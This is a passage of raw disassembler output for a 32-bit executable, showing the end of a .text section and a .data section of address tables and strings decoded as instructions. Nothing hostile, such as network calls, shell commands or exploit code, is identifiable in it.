  411371:	mov    edi,0x5301fb0
  411376:	xor    al,0x1e
  411378:	xor    ebp,ebx
  41137a:	xlat   BYTE PTR ds:[ebx]
  41137b:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  41137d:	push   ss
  41137e:	dec    edx
  41137f:	push   esi
  411380:	addr16 mov eax,ds:0xf8a3
  411384:	aad    0x7c
  411386:	push   ss
  411387:	and    dl,bh
  411389:	test   DWORD PTR [edi],0xff40568e
  41138f:	push   cs
  411390:	pop    esi
  411391:	push   es
  411392:	push   cs
  411393:	jno    0x4113f1
  411395:	jge    0x411350
  411397:	in     al,dx
  411398:	mov    ch,dh
  41139a:	pop    ds
  41139b:	push   es
  41139c:	pushf  
  41139d:	retf   0xf57a
  4113a0:	push   eax
  4113a1:	adc    al,dl
  4113a3:	mov    al,0xbc
  4113a5:	push   esi
  4113a6:	or     eax,0x273e6c6b
  4113ab:	mul    ecx
  4113ad:	ins    DWORD PTR es:[edi],dx
  4113ae:	test   BYTE PTR [ebp-0x559dec49],dl
  4113b4:	xchg   ebp,eax
  4113b5:	(bad)  
  4113b6:	imul   ebp,DWORD PTR [esi],0xffffffdb
  4113b9:	sub    ecx,DWORD PTR [ecx+0x5403052b]
  4113bf:	enter  0x76d0,0x72
  4113c3:	jbe    0x41138c
  4113c5:	jmp    0xa0b8:0x6d12de8a
  4113cc:	pop    es
  4113cd:	shl    BYTE PTR [ebp+0x109b67b0],0xfc
  4113d4:	jp     0x411380
  4113d6:	in     eax,0xd8
  4113d8:	mov    ah,0xeb
  4113da:	mov    dl,BYTE PTR [ecx-0x63]
  4113dd:	test   al,0xde
  4113df:	dec    ecx
  4113e0:	dec    ecx
  4113e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4113e2:	inc    ebx
  4113e3:	loop   0x41136d
  4113e5:	xlat   BYTE PTR ds:[ebx]
  4113e6:	rcr    DWORD PTR [ecx+0x6df54f42],0x31
  4113ed:	fimul  DWORD PTR [ebp-0x3c]
  4113f0:	std    
  4113f1:	pop    ecx
  4113f2:	imul   esi,DWORD PTR [ebx-0x13327e50],0x47
  4113f9:	xchg   esi,eax
  4113fa:	pop    ss
  4113fb:	(bad)  
  4113fc:	fist   WORD PTR [ebx+0x2e]
  4113ff:	cs mov dh,0x8f
  411402:	xchg   esi,eax
  411403:	int    0x61
  411405:	sub    DWORD PTR [edx-0x77],0xffffff96
  411409:	test   BYTE PTR [ebx-0x731d17c2],dh
  41140f:	outs   dx,DWORD PTR ds:[esi]
  411410:	(bad)  
  411411:	jno    0x4113cc
  411413:	(bad)  
  411414:	push   eax
  411415:	jg     0x411401
  411417:	cdq    
  411418:	mov    BYTE PTR [ecx+0x5fc01a70],cl
  41141e:	cmp    BYTE PTR ds:0x3e20150f,ch
  411424:	mov    eax,0x321347c3
  411429:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41142a:	add    BYTE PTR [ebx-0x50],bh
  41142d:	add    eax,0xb554400f
  411432:	or     al,BYTE PTR [edx-0x6c]
  411435:	popa   
  411436:	add    dh,al
  411438:	sbb    ebx,DWORD PTR [ecx-0x362e45f8]
  41143e:	xchg   esi,eax
  41143f:	test   BYTE PTR [ebx],ah
  411441:	fnstenv [ebx-0xf4a3d17]
  411447:	fs repnz push esi
  41144a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41144b:	mov    dh,0xd7
  41144d:	popf   
  41144e:	adc    al,0xef
  411450:	xchg   esi,eax
  411451:	out    0x8,eax
  411453:	jno    0x411414
  411455:	jae    0x411451
  411457:	pop    esp
  411458:	sahf   
  411459:	sahf   
  41145a:	push   ebx
  41145b:	bound  eax,QWORD PTR [ebp+ecx*2+0x44]
  41145f:	lods   al,BYTE PTR ds:[esi]
  411460:	repnz mov bl,0x9f
  411463:	shl    bl,1
  411465:	lods   al,BYTE PTR ds:[esi]
  411466:	dec    esi
  411467:	int3   
  411468:	lods   al,BYTE PTR ds:[esi]
  411469:	pop    ss
  41146a:	scas   al,BYTE PTR es:[edi]
  41146b:	lock cld 
  41146d:	jg     0x4114a2
  41146f:	fisub  DWORD PTR [ebx-0x9]
  411472:	sbb    ebx,esi
  411474:	mov    ebp,0x8835506d
  411479:	cmp    edx,esp
  41147b:	mov    edx,0x434a54b5
  411480:	add    ebx,DWORD PTR [edx+ebx*1]
  411483:	dec    ebx
  411484:	xor    edx,edx
  411486:	add    DWORD PTR [ebp-0xc],ebx
  411489:	pop    ebx
  41148a:	mov    eax,DWORD PTR [ebp-0xc]
  41148d:	pop    edi
  41148e:	pop    esi
  41148f:	pop    ebx
  411490:	leave  
  411491:	ret    0x10

Disassembly of section .data:

00412000 <.data>:
  412000:	and    BYTE PTR [ecx],ch
  412002:	add    DWORD PTR [eax],eax
  412004:	sub    ch,BYTE PTR [ecx]
  412006:	add    DWORD PTR [eax],eax
  412008:	xor    al,0x29
  41200a:	add    DWORD PTR [eax],eax
  41200c:	inc    eax
  41200d:	sub    DWORD PTR [ecx],eax
  41200f:	add    BYTE PTR [edx+0x29],cl
  412012:	add    DWORD PTR [eax],eax
  412014:	pop    eax
  412015:	sub    DWORD PTR [ecx],eax
  412017:	add    BYTE PTR [edx+0x29],ah
  41201a:	add    DWORD PTR [eax],eax
  41201c:	je     0x412047
  41201e:	add    DWORD PTR [eax],eax
  412020:	jle    0x41204b
  412022:	add    DWORD PTR [eax],eax
  412024:	mov    WORD PTR [ecx],gs
  412026:	add    DWORD PTR [eax],eax
  412028:	xchg   esi,eax
  412029:	sub    DWORD PTR [ecx],eax
  41202b:	add    BYTE PTR [esi-0x4ffffed7],ah
  412031:	sub    DWORD PTR [ecx],eax
  412033:	add    BYTE PTR [ecx+ebp*1+0x29c60001],bh
  41203a:	add    DWORD PTR [eax],eax
  41203c:	aam    0x29
  41203e:	add    DWORD PTR [eax],eax
  412040:	loopne 0x41206b
  412042:	add    DWORD PTR [eax],eax
  412044:	jmp    0x129:0xf2000129
  41204b:	add    BYTE PTR [eax],al
  41204d:	sub    al,BYTE PTR [ecx]
  41204f:	add    BYTE PTR [edx],cl
  412051:	sub    al,BYTE PTR [ecx]
  412053:	add    BYTE PTR [edx+ebp*1],dl
  412056:	add    DWORD PTR [eax],eax
  412058:	and    ch,BYTE PTR [edx]
  41205a:	add    DWORD PTR [eax],eax
  41205c:	sub    al,0x2a
  41205e:	add    DWORD PTR [eax],eax
  412060:	xor    al,0x2a
  412062:	add    DWORD PTR [eax],eax
  412064:	inc    eax
  412065:	sub    al,BYTE PTR [ecx]
  412067:	add    BYTE PTR [edx+0x2a],cl
  41206a:	add    DWORD PTR [eax],eax
  41206c:	push   esp
  41206d:	sub    al,BYTE PTR [ecx]
  41206f:	add    BYTE PTR [esi+0x2a],bl
  412072:	add    DWORD PTR [eax],eax
  412074:	data16 sub al,BYTE PTR [ecx]
  412077:	add    BYTE PTR [eax+0x2a],dh
  41207a:	add    DWORD PTR [eax],eax
  41207c:	jp     0x4120a8
  41207e:	add    DWORD PTR [eax],eax
  412080:	sub    BYTE PTR [edx],0x1
  412083:	add    BYTE PTR [esi-0x65fffed6],cl
  412089:	sub    al,BYTE PTR [ecx]
  41208b:	add    BYTE PTR [edx-0x53fffed6],ah
  412091:	sub    al,BYTE PTR [ecx]
  412093:	add    BYTE PTR [edx+ebp*1+0x2ac00001],dh
  41209a:	add    DWORD PTR [eax],eax
  41209c:	retf   0x12a
  41209f:	add    ah,dl
  4120a1:	sub    al,BYTE PTR [ecx]
  4120a3:	add    dh,bl
  4120a5:	sub    al,BYTE PTR [ecx]
  4120a7:	add    dl,dh
  4120a9:	sub    al,BYTE PTR [ecx]
  4120ab:	add    dh,bh
  4120ad:	sub    al,BYTE PTR [ecx]
  4120af:	add    BYTE PTR [eax],al
  4120b1:	add    BYTE PTR [eax],al
  4120b3:	add    BYTE PTR [edx],bl
  4120b5:	sub    eax,DWORD PTR [ecx]
  4120b7:	add    BYTE PTR [esi],ch
  4120b9:	sub    eax,DWORD PTR [ecx]
  4120bb:	add    BYTE PTR [esi],bh
  4120bd:	sub    eax,DWORD PTR [ecx]
  4120bf:	add    BYTE PTR [ebx+ebp*1+0x1],cl
  4120c3:	add    BYTE PTR [eax+0x2b],bl
  4120c6:	add    DWORD PTR [eax],eax
  4120c8:	push   0x7e00012b
  4120cd:	sub    eax,DWORD PTR [ecx]
  4120cf:	add    BYTE PTR [edx-0x59fffed5],dl
  4120d5:	sub    eax,DWORD PTR [ecx]
  4120d7:	add    BYTE PTR [ebx+ebp*1+0x2bca0001],bh
  4120de:	add    DWORD PTR [eax],eax
  4120e0:	loopne 0x41210d
  4120e2:	add    DWORD PTR [eax],eax
  4120e4:	in     al,dx
  4120e5:	sub    eax,DWORD PTR [ecx]
  4120e7:	add    dh,bh
  4120e9:	sub    eax,DWORD PTR [ecx]
  4120eb:	add    BYTE PTR [esi],dl
  4120ed:	sub    al,0x1
  4120ef:	add    BYTE PTR [eax],ch
  4120f1:	sub    al,0x1
  4120f3:	add    BYTE PTR [eax],bh
  4120f5:	sub    al,0x1
  4120f7:	add    BYTE PTR [edx+0x2c],al
  4120fa:	add    DWORD PTR [eax],eax
  4120fc:	pop    eax
  4120fd:	sub    al,0x1
  4120ff:	add    BYTE PTR [edx+0x2c],dh
  412102:	add    DWORD PTR [eax],eax
  412104:	jle    0x412132
  412106:	add    DWORD PTR [eax],eax
  412108:	mov    ch,BYTE PTR [ecx+eax*1]
  41210b:	add    BYTE PTR [esi-0x47fffed4],bl
  412111:	sub    al,0x1
  412113:	add    ah,al
  412115:	sub    al,0x1
  412117:	add    dl,dl
  412119:	sub    al,0x1
  41211b:	add    ah,ah
  41211d:	sub    al,0x1
  41211f:	add    al,dh
  412121:	sub    al,0x1
  412123:	add    BYTE PTR [esi],al
  412125:	sub    eax,0x2d140001
  41212a:	add    DWORD PTR [eax],eax
  41212c:	and    ch,BYTE PTR ds:0x2d300001
  412132:	add    DWORD PTR [eax],eax
  412134:	dec    edx
  412135:	sub    eax,0x2d5e0001
  41213a:	add    DWORD PTR [eax],eax
  41213c:	push   0x2d
  41213e:	add    DWORD PTR [eax],eax
  412140:	jp     0x41216f
  412142:	add    DWORD PTR [eax],eax
  412144:	xchg   esi,eax
  412145:	sub    eax,0x2da60001
  41214a:	add    DWORD PTR [eax],eax
  41214c:	mov    dh,0x2d
  41214e:	add    DWORD PTR [eax],eax
  412150:	(bad)  
  412151:	sub    eax,0x2dd20001
  412156:	add    DWORD PTR [eax],eax
  412158:	loop   0x412187
  41215a:	add    DWORD PTR [eax],eax
  41215c:	hlt    
  41215d:	sub    eax,0x2dfe0001
  412162:	add    DWORD PTR [eax],eax
  412164:	push   cs
  412165:	add    DWORD PTR cs:[eax],eax
  412168:	push   ds
  412169:	add    DWORD PTR cs:[eax],eax
  41216c:	sub    BYTE PTR [esi],ch
  41216e:	add    DWORD PTR [eax],eax
  412170:	add    BYTE PTR [eax],al
  412172:	add    BYTE PTR [eax],al
  412174:	dec    edx
  412175:	add    DWORD PTR cs:[eax],eax
  412178:	add    BYTE PTR [eax],al
  41217a:	add    BYTE PTR [eax],al
  41217c:	push   0x8000012e
  412181:	add    DWORD PTR cs:[eax],eax
  412184:	mov    WORD PTR [esi],gs
  412186:	add    DWORD PTR [eax],eax
  412188:	call   0x12e:0xb200012e
  41218f:	add    dh,al
  412191:	add    DWORD PTR cs:[eax],eax
  412194:	fsubr  QWORD PTR [esi]
  412196:	add    DWORD PTR [eax],eax
  412198:	call   0xf84122cb
  41219d:	add    DWORD PTR cs:[eax],eax
  4121a0:	adc    BYTE PTR [edi],ch
  4121a2:	add    DWORD PTR [eax],eax
  4121a4:	push   ds
  4121a5:	das    
  4121a6:	add    DWORD PTR [eax],eax
  4121a8:	xor    BYTE PTR [edi],ch
  4121aa:	add    DWORD PTR [eax],eax
  4121ac:	inc    eax
  4121ad:	das    
  4121ae:	add    DWORD PTR [eax],eax
  4121b0:	push   esi
  4121b1:	das    
  4121b2:	add    DWORD PTR [eax],eax
  4121b4:	data16 das 
  4121b6:	add    DWORD PTR [eax],eax
  4121b8:	jbe    0x4121e9
  4121ba:	add    DWORD PTR [eax],eax
  4121bc:	mov    ch,BYTE PTR [edi]
  4121be:	add    DWORD PTR [eax],eax
  4121c0:	xchg   esi,eax
  4121c1:	das    
  4121c2:	add    DWORD PTR [eax],eax
  4121c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121c5:	das    
  4121c6:	add    DWORD PTR [eax],eax
  4121c8:	mov    dl,0x2f
  4121ca:	add    DWORD PTR [eax],eax
  4121cc:	enter  0x12f,0x0
  4121d0:	loopne 0x412201
  4121d2:	add    DWORD PTR [eax],eax
  4121d4:	hlt    
  4121d5:	das    
  4121d6:	add    DWORD PTR [eax],eax
  4121d8:	add    dh,BYTE PTR [eax]
  4121da:	add    DWORD PTR [eax],eax
  4121dc:	sbb    BYTE PTR [eax],dh
  4121de:	add    DWORD PTR [eax],eax
  4121e0:	xor    BYTE PTR cs:[ecx],al
  4121e3:	add    BYTE PTR [edx],bh
  4121e5:	xor    BYTE PTR [ecx],al
  4121e7:	add    BYTE PTR [eax+0x30],cl
  4121ea:	add    DWORD PTR [eax],eax
  4121ec:	push   edx
  4121ed:	xor    BYTE PTR [ecx],al
  4121ef:	add    BYTE PTR [esi+0x30],ah
  4121f2:	add    DWORD PTR [eax],eax
  4121f4:	jbe    0x412226
  4121f6:	add    DWORD PTR [eax],eax
  4121f8:	mov    dh,BYTE PTR [eax]
  4121fa:	add    DWORD PTR [eax],eax
  4121fc:	pushf  
  4121fd:	xor    BYTE PTR [ecx],al
  4121ff:	add    BYTE PTR [eax-0x3bfffed0],dh
  412205:	xor    BYTE PTR [ecx],al
  412207:	add    ah,dl
  412209:	xor    BYTE PTR [ecx],al
  41220b:	add    dl,ch
  41220d:	xor    BYTE PTR [ecx],al
  41220f:	add    BYTE PTR [edx],al
  412211:	xor    DWORD PTR [ecx],eax
  412213:	add    BYTE PTR [edx],bl
  412215:	xor    DWORD PTR [ecx],eax
  412217:	add    BYTE PTR [esi],ah
  412219:	xor    DWORD PTR [ecx],eax
  41221b:	add    BYTE PTR [eax],bh
  41221d:	xor    DWORD PTR [ecx],eax
  41221f:	add    BYTE PTR [edx+0x31],cl
  412222:	add    DWORD PTR [eax],eax
  412224:	push   esi
  412225:	xor    DWORD PTR [ecx],eax
  412227:	add    BYTE PTR [eax+0x31],ch
  41222a:	add    DWORD PTR [eax],eax
  41222c:	jbe    0x41225f
  41222e:	add    DWORD PTR [eax],eax
  412230:	xor    BYTE PTR [ecx],0x1
  412233:	add    BYTE PTR [esi-0x59fffecf],dl
  412239:	xor    DWORD PTR [ecx],eax
  41223b:	add    BYTE PTR [eax-0x2dfffecf],bh
  412241:	xor    DWORD PTR [ecx],eax
  412243:	add    dl,ch
  412245:	xor    DWORD PTR [ecx],eax
  412247:	add    BYTE PTR [eax],al
  412249:	add    BYTE PTR [eax],al
  41224b:	add    BYTE PTR [esi],al
  41224d:	xor    al,BYTE PTR [ecx]
  41224f:	add    BYTE PTR [edx+esi*1],bl
  412252:	add    DWORD PTR [eax],eax
  412254:	xor    dh,BYTE PTR [edx]
  412256:	add    DWORD PTR [eax],eax
  412258:	inc    edx
  412259:	xor    al,BYTE PTR [ecx]
  41225b:	add    BYTE PTR [edx+0x32],dl
  41225e:	add    DWORD PTR [eax],eax
  412260:	pusha  
  412261:	xor    al,BYTE PTR [ecx]
  412263:	add    BYTE PTR [eax+0x32],dh
  412266:	add    DWORD PTR [eax],eax
  412268:	test   BYTE PTR [edx],dh
  41226a:	add    DWORD PTR [eax],eax
  41226c:	xchg   esp,eax
  41226d:	xor    al,BYTE PTR [ecx]
  41226f:	add    BYTE PTR [eax-0x41fffece],ch
  412275:	xor    al,BYTE PTR [ecx]
  412277:	add    ah,cl
  412279:	xor    al,BYTE PTR [ecx]
  41227b:	add    al,ah
  41227d:	xor    al,BYTE PTR [ecx]
  41227f:	add    al,dh
  412281:	xor    al,BYTE PTR [ecx]
  412283:	add    BYTE PTR [edx],al
  412285:	xor    eax,DWORD PTR [ecx]
  412287:	add    BYTE PTR [edx],bl
  412289:	xor    eax,DWORD PTR [ecx]
  41228b:	add    BYTE PTR [esi],ah
  41228d:	xor    eax,DWORD PTR [ecx]
  41228f:	add    BYTE PTR [ebx+esi*1],dh
  412292:	add    DWORD PTR [eax],eax
  412294:	inc    esp
  412295:	xor    eax,DWORD PTR [ecx]
  412297:	add    BYTE PTR [edx+0x33],dl
  41229a:	add    DWORD PTR [eax],eax
  41229c:	push   0x7a000133
  4122a1:	xor    eax,DWORD PTR [ecx]
  4122a3:	add    BYTE PTR [esi-0x6bfffecd],al
  4122a9:	xor    eax,DWORD PTR [ecx]
  4122ab:	add    BYTE PTR [esi-0x4bfffecd],ah
  4122b1:	xor    eax,DWORD PTR [ecx]
  4122b3:	add    dh,al
  4122b5:	xor    eax,DWORD PTR [ecx]
  4122b7:	add    al,bl
  4122b9:	xor    eax,DWORD PTR [ecx]
  4122bb:	add    dl,ch
  4122bd:	xor    eax,DWORD PTR [ecx]
  4122bf:	add    dl,bh
  4122c1:	xor    eax,DWORD PTR [ecx]
  4122c3:	add    BYTE PTR [esi],al
  4122c5:	xor    al,0x1
  4122c7:	add    BYTE PTR [esp+esi*1],bl
  4122ca:	add    DWORD PTR [eax],eax
  4122cc:	cmp    BYTE PTR [ecx+eax*1],dh
  4122cf:	add    BYTE PTR [edx+0x34],dl
  4122d2:	add    DWORD PTR [eax],eax
  4122d4:	data16 xor al,0x1
  4122d7:	add    BYTE PTR [esp+esi*1+0x1],dh
  4122db:	add    BYTE PTR [eax-0x6dfffecc],al
  4122e1:	xor    al,0x1
  4122e3:	add    BYTE PTR [edx-0x51fffecc],ah
  4122e9:	xor    al,0x1
  4122eb:	add    BYTE PTR [edx-0x37fffecc],bh
  4122f1:	xor    al,0x1
  4122f3:	add    al,ah
  4122f5:	xor    al,0x1
  4122f7:	add    al,dh
  4122f9:	xor    al,0x1
  4122fb:	add    BYTE PTR [eax],cl
  4122fd:	xor    eax,0x351a0001
  412302:	add    DWORD PTR [eax],eax
  412304:	sub    dh,BYTE PTR ds:0x35380001
  41230a:	add    DWORD PTR [eax],eax
  41230c:	dec    edx
  41230d:	xor    eax,0x35580001
  412312:	add    DWORD PTR [eax],eax
  412314:	fs xor eax,0x35720001
  41231a:	add    DWORD PTR [eax],eax
  41231c:	jl     0x412353
  41231e:	add    DWORD PTR [eax],eax
  412320:	xchg   esp,eax
  412321:	xor    eax,0x35a40001
  412326:	add    DWORD PTR [eax],eax
  412328:	mov    ah,0x35
  41232a:	add    DWORD PTR [eax],eax
  41232c:	ret    0x135
  41232f:	add    al,dl
  412331:	xor    eax,0x35e00001
  412336:	add    DWORD PTR [eax],eax
  412338:	div    BYTE PTR ds:0x36080001
  41233e:	add    DWORD PTR [eax],eax
  412340:	push   ss
  412341:	add    DWORD PTR ss:[eax],eax
  412344:	sub    al,0x36
  412346:	add    DWORD PTR [eax],eax
  412348:	cmp    dh,BYTE PTR [esi]
  41234a:	add    DWORD PTR [eax],eax
  41234c:	push   edx
  41234d:	add    DWORD PTR ss:[eax],eax
  412350:	pop    esi
  412351:	add    DWORD PTR ss:[eax],eax
  412354:	push   0x36
  412356:	add    DWORD PTR [eax],eax
  412358:	jbe    0x412390
  41235a:	add    DWORD PTR [eax],eax
  41235c:	test   BYTE PTR [esi],dh
  41235e:	add    DWORD PTR [eax],eax
  412360:	xchg   esi,eax
  412361:	add    DWORD PTR ss:[eax],eax
  412364:	mov    ds:0xb4000136,al
  412369:	add    DWORD PTR ss:[eax],eax
  41236c:	shl    BYTE PTR [esi],0x1
  41236f:	add    dh,cl
  412371:	add    DWORD PTR ss:[eax],eax
  412374:	fdiv   QWORD PTR [esi]
  412376:	add    DWORD PTR [eax],eax
  412378:	call   0xf64124b3
  41237d:	add    DWORD PTR ss:[eax],eax
  412380:	add    al,0x37
  412382:	add    DWORD PTR [eax],eax
  412384:	adc    al,0x37
  412386:	add    DWORD PTR [eax],eax
  412388:	es aaa 
  41238a:	add    DWORD PTR [eax],eax
  41238c:	cmp    al,0x37
  41238e:	add    DWORD PTR [eax],eax
  412390:	inc    esi
  412391:	aaa    
  412392:	add    DWORD PTR [eax],eax
  412394:	push   esp
  412395:	aaa    
  412396:	add    DWORD PTR [eax],eax
  412398:	fs aaa 
  41239a:	add    DWORD PTR [eax],eax
  41239c:	jbe    0x4123d5
  41239e:	add    DWORD PTR [eax],eax
  4123a0:	test   BYTE PTR [edi],dh
  4123a2:	add    DWORD PTR [eax],eax
  4123a4:	cwde   
  4123a5:	aaa    
  4123a6:	add    DWORD PTR [eax],eax
  4123a8:	mov    dl,0x37
  4123aa:	add    DWORD PTR [eax],eax
  4123ac:	les    esi,FWORD PTR [edi]
  4123ae:	add    DWORD PTR [eax],eax
  4123b0:	aam    0x37
  4123b2:	add    DWORD PTR [eax],eax
  4123b4:	call   0xfa4124f0
  4123b9:	aaa    
  4123ba:	add    DWORD PTR [eax],eax
  4123bc:	or     bh,BYTE PTR [eax]
  4123be:	add    DWORD PTR [eax],eax
  4123c0:	push   ss
  4123c1:	cmp    BYTE PTR [ecx],al
  4123c3:	add    BYTE PTR [eax+edi*1],dh
  4123c6:	add    DWORD PTR [eax],eax
  4123c8:	inc    esi
  4123c9:	cmp    BYTE PTR [ecx],al
  4123cb:	add    BYTE PTR [eax+edi*1+0x1],bl
  4123cf:	add    BYTE PTR [eax+0x38],bh
  4123d2:	add    DWORD PTR [eax],eax
  4123d4:	nop
  4123d5:	cmp    BYTE PTR [ecx],al
  4123d7:	add    BYTE PTR [eax+edi*1+0x38b00001],bl
  4123de:	add    DWORD PTR [eax],eax
  4123e0:	mov    edx,0xc8000138
  4123e5:	cmp    BYTE PTR [ecx],al
  4123e7:	add    ah,ah
  4123e9:	cmp    BYTE PTR [ecx],al
  4123eb:	add    dl,dh
  4123ed:	cmp    BYTE PTR [ecx],al
  4123ef:	add    BYTE PTR [esi],al
  4123f1:	cmp    DWORD PTR [ecx],eax
  4123f3:	add    BYTE PTR [eax],bl
  4123f5:	cmp    DWORD PTR [ecx],eax
  4123f7:	add    BYTE PTR [edx],ch
  4123f9:	cmp    DWORD PTR [ecx],eax
  4123fb:	add    BYTE PTR [edx],bh
  4123fd:	cmp    DWORD PTR [ecx],eax
  4123ff:	add    BYTE PTR [eax+0x39],dl
  412402:	add    DWORD PTR [eax],eax
  412404:	cmp    WORD PTR [ecx],ax
	...
  41240f:	add    dh,cl
  412411:	add    al,cl
  412413:	dec    ebp
  412414:	add    BYTE PTR [eax],al
  412416:	add    BYTE PTR [eax],al
  412418:	add    al,BYTE PTR [eax]
  41241a:	add    BYTE PTR [eax],al
  41241c:	dec    ebp
  41241d:	add    BYTE PTR [eax],al
  41241f:	add    BYTE PTR [edx],bh
  412421:	cmp    al,BYTE PTR [ebx]
  412423:	add    BYTE PTR [edx],bh
  412425:	and    al,0x3
	...
  41242f:	add    dh,cl
  412431:	add    al,cl
  412433:	dec    ebp
  412434:	add    BYTE PTR [eax],al
  412436:	add    BYTE PTR [eax],al
  412438:	pop    esi
  412439:	and    al,0x1
  41243b:	add    BYTE PTR [ecx],al
  41243d:	add    BYTE PTR [eax],al
  41243f:	add    BYTE PTR [ecx],al
  412441:	add    BYTE PTR [eax],al
  412443:	add    BYTE PTR [ecx],al
  412445:	add    BYTE PTR [eax],al
  412447:	add    BYTE PTR [esp+0x1],dl
  41244b:	add    BYTE PTR [eax+0x24],bl
  41244e:	add    DWORD PTR [eax],eax
  412450:	pop    esp
  412451:	and    al,0x1
  412453:	add    BYTE PTR [esi+0x6f000032],al
  412459:	and    al,0x1
  41245b:	add    BYTE PTR [eax],al
  41245d:	add    BYTE PTR [esi+0x64],ch
  412460:	jae    0x4124d4
  412462:	bound  esp,QWORD PTR [esi+0x64]
  412465:	push   edi
  412466:	inc    si
  412468:	popa   
  412469:	xor    al,0x2e
  41246b:	je     0x4124dc
  41246d:	jo     0x41246f
  41246f:	aas    
  412470:	dec    eax
  412471:	imul   esp,DWORD PTR [ebp+eiz*2+0x50],0x746e696f
  412479:	gs jb  0x4124cb
  41247c:	jb     0x4124e7
  41247e:	imul   ebp,DWORD PTR [bp+0x61],0x5940406c
  412486:	inc    edi
  412487:	inc    esi
  412488:	dec    ebx
  412489:	push   eax
  41248a:	inc    ecx
  41248b:	dec    ecx
  41248c:	push   eax
  41248d:	inc    ecx
  41248e:	inc    esp
  41248f:	cmp    al,0x56
	...
  412499:	add    BYTE PTR [eax],al
  41249b:	add    BYTE PTR [eiz*1+0x1],dl
  4124a2:	add    BYTE PTR [eax],al
  4124a4:	add    BYTE PTR [eax],al
  4124a6:	add    BYTE PTR [eax],al
  4124a8:	push   cs
  4124a9:	sub    eax,DWORD PTR [ecx]
  4124ab:	add    BYTE PTR [eax],al
  4124ad:	and    BYTE PTR [ecx],al
  4124af:	add    al,cl
  4124b1:	and    eax,0x1
  4124b6:	add    BYTE PTR [eax],al
  4124b8:	add    BYTE PTR [eax],al
  4124ba:	add    BYTE PTR [eax],al
  4124bc:	inc    eax
  4124bd:	add    DWORD PTR cs:[eax],eax
  4124c0:	mov    ah,0x20
  4124c2:	add    DWORD PTR [eax],eax
  4124c4:	mov    BYTE PTR [esi],ah
  4124c6:	add    DWORD PTR [eax],eax
	...
  4124d0:	pop    esp
  4124d1:	add    DWORD PTR cs:[eax],eax
  4124d4:	je     0x4124f7
  4124d6:	add    DWORD PTR [eax],eax
  4124d8:	nop
  4124d9:	add    DWORD PTR es:[eax],eax
	...
  4124e4:	clc    
  4124e5:	xor    DWORD PTR [ecx],eax
  4124e7:	add    BYTE PTR [ecx+eiz*1+0x1],bh
  4124eb:	add    BYTE PTR [eax+0x27],ah
  4124ee:	add    DWORD PTR [eax],eax
	...
  4124f8:	jb     0x412533
  4124fa:	add    DWORD PTR [eax],eax
  4124fc:	dec    esp
  4124fd:	and    al,BYTE PTR [ecx]
	...
  412513:	add    BYTE PTR [eax],ah
  412515:	sub    DWORD PTR [ecx],eax
  412517:	add    BYTE PTR [edx],ch
  412519:	sub    DWORD PTR [ecx],eax
  41251b:	add    BYTE PTR [ecx+ebp*1],dh
  41251e:	add    DWORD PTR [eax],eax
  412520:	inc    eax
  412521:	sub    DWORD PTR [ecx],eax
  412523:	add    BYTE PTR [edx+0x29],cl
  412526:	add    DWORD PTR [eax],eax
  412528:	pop    eax
  412529:	sub    DWORD PTR [ecx],eax
  41252b:	add    BYTE PTR [edx+0x29],ah
  41252e:	add    DWORD PTR [eax],eax
  412530:	je     0x41255b
  412532:	add    DWORD PTR [eax],eax
  412534:	jle    0x41255f
  412536:	add    DWORD PTR [eax],eax
  412538:	mov    WORD PTR [ecx],gs
  41253a:	add    DWORD PTR [eax],eax
  41253c:	xchg   esi,eax
  41253d:	sub    DWORD PTR [ecx],eax
  41253f:	add    BYTE PTR [esi-0x4ffffed7],ah
  412545:	sub    DWORD PTR [ecx],eax
  412547:	add    BYTE PTR [ecx+ebp*1+0x29c60001],bh
  41254e:	add    DWORD PTR [eax],eax
  412550:	aam    0x29
  412552:	add    DWORD PTR [eax],eax
  412554:	loopne 0x41257f
  412556:	add    DWORD PTR [eax],eax
  412558:	jmp    0x129:0xf2000129
  41255f:	add    BYTE PTR [eax],al
  412561:	sub    al,BYTE PTR [ecx]
  412563:	add    BYTE PTR [edx],cl
  412565:	sub    al,BYTE PTR [ecx]
  412567:	add    BYTE PTR [edx+ebp*1],dl
  41256a:	add    DWORD PTR [eax],eax
  41256c:	and    ch,BYTE PTR [edx]
  41256e:	add    DWORD PTR [eax],eax
  412570:	sub    al,0x2a
  412572:	add    DWORD PTR [eax],eax
  412574:	xor    al,0x2a
  412576:	add    DWORD PTR [eax],eax
  412578:	inc    eax
  412579:	sub    al,BYTE PTR [ecx]
  41257b:	add    BYTE PTR [edx+0x2a],cl
  41257e:	add    DWORD PTR [eax],eax
  412580:	push   esp
  412581:	sub    al,BYTE PTR [ecx]
  412583:	add    BYTE PTR [esi+0x2a],bl
  412586:	add    DWORD PTR [eax],eax
  412588:	data16 sub al,BYTE PTR [ecx]
  41258b:	add    BYTE PTR [eax+0x2a],dh
  41258e:	add    DWORD PTR [eax],eax
  412590:	jp     0x4125bc
  412592:	add    DWORD PTR [eax],eax
  412594:	sub    BYTE PTR [edx],0x1
  412597:	add    BYTE PTR [esi-0x65fffed6],cl
  41259d:	sub    al,BYTE PTR [ecx]
  41259f:	add    BYTE PTR [edx-0x53fffed6],ah
  4125a5:	sub    al,BYTE PTR [ecx]
  4125a7:	add    BYTE PTR [edx+ebp*1+0x2ac00001],dh
  4125ae:	add    DWORD PTR [eax],eax
  4125b0:	retf   0x12a
  4125b3:	add    ah,dl
  4125b5:	sub    al,BYTE PTR [ecx]
  4125b7:	add    dh,bl
  4125b9:	sub    al,BYTE PTR [ecx]
  4125bb:	add    dl,dh
  4125bd:	sub    al,BYTE PTR [ecx]
  4125bf:	add    dh,bh
  4125c1:	sub    al,BYTE PTR [ecx]
  4125c3:	add    BYTE PTR [eax],al
  4125c5:	add    BYTE PTR [eax],al
  4125c7:	add    BYTE PTR [edx],bl
  4125c9:	sub    eax,DWORD PTR [ecx]
  4125cb:	add    BYTE PTR [esi],ch
  4125cd:	sub    eax,DWORD PTR [ecx]
  4125cf:	add    BYTE PTR [esi],bh
  4125d1:	sub    eax,DWORD PTR [ecx]
  4125d3:	add    BYTE PTR [ebx+ebp*1+0x1],cl
  4125d7:	add    BYTE PTR [eax+0x2b],bl
  4125da:	add    DWORD PTR [eax],eax
  4125dc:	push   0x7e00012b
  4125e1:	sub    eax,DWORD PTR [ecx]
